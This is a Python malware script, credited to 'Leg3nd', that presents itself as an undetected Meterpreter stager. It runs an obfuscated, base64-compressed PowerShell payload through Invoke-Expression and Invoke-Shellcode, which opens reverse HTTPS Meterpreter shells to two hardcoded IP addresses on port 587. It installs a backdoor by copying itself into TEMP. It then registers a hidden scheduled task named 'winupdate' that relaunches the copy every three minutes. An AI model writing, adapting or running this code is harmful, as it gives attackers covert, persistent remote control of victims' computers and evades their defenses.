'''
Leg3nd @ https://leg3nd.me

Undetected meterpreter code execution
via powershell HTTPS stager.
'''

import sys, base64, subprocess, os

def run_script(ip, port):
  ps_command_minified = r'''powershell.exe -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"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\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();clear;\"Load complete.\""; Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost '''+ip+''' –Lport '''+str(port)+''' –Force"'''
  proc = subprocess.Popen(ps_command_minified, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   
try:  
  # add a backdoor
  # create our schtasks XML file for some advanced settings
  exe_loc = str(sys.executable) 
  backdoor_loc = os.getenv('TEMP') + '\\' + "WRE8284.exe"
  proc = subprocess.Popen("copy /y %s %s" %(exe_loc, backdoor_loc), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  
  
  fileopen = open(os.getenv("TEMP") + "\\tmp.xml", "w")
  data = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT3M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2005-10-12T07:36:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>""" + backdoor_loc + """</Command>
    </Exec>
  </Actions>
</Task>"""
  fileopen.write(data)
  fileopen.close()
  
  backdoor_command = 'SCHTASKS /f /Create /tn winupdate /xml "' + str(os.getenv("TEMP") + "\\tmp.xml") + '"'
  proc = subprocess.Popen(backdoor_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  
  # run powershell script
  run_script('172.16.42.2', 587)
  run_script('172.16.42.3', 587)
  
except Exception, e:
  #print "Exception: " + str(e)
  pass